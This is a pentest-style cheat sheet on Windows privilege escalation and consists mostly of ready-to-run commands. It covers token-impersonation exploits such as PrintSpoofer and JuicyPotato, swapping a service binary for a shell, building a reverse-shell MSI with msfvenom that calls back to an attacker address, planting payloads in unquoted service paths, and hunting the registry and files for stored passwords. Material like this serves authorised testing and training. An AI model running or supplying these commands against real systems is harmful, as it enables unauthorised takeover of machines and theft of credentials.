---
title: "Windows Privilege Escalation"
description: "Common Windows privilege escalation techniques â€” from enumeration to SYSTEM."
---

## Automated Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

## Token Impersonation (Potatoes)

If you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:

```bash
# Check privileges
whoami /priv

# PrintSpoofer (Windows 10 / Server 2019)
.\PrintSpoofer64.exe -i -c cmd

# GodPotato
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# JuicyPotato (older systems)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c "{CLSID}"
```

## Weak Service Permissions

```powershell
# Find services with weak permissions
. .\PowerUp.ps1
Get-ModifiableService

# Replace service binary
copy shell.exe "C:\path\to\service.exe"
sc start VulnerableService
```

## AlwaysInstallElevated

```powershell
# Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

## Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# If path is: C:\Program Files\My Service\service.exe
# Place payload at: C:\Program.exe or C:\Program Files\My.exe
```

## Stored Credentials

```powershell
# Search for passwords in common locations
findstr /si password *.txt *.ini *.config
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows credential manager
cmdkey /list
runas /savecred /user:admin cmd.exe
```

<Warning>
  Potato attacks require the target to be running a vulnerable Windows version with the appropriate privileges. Always verify before attempting.
</Warning>
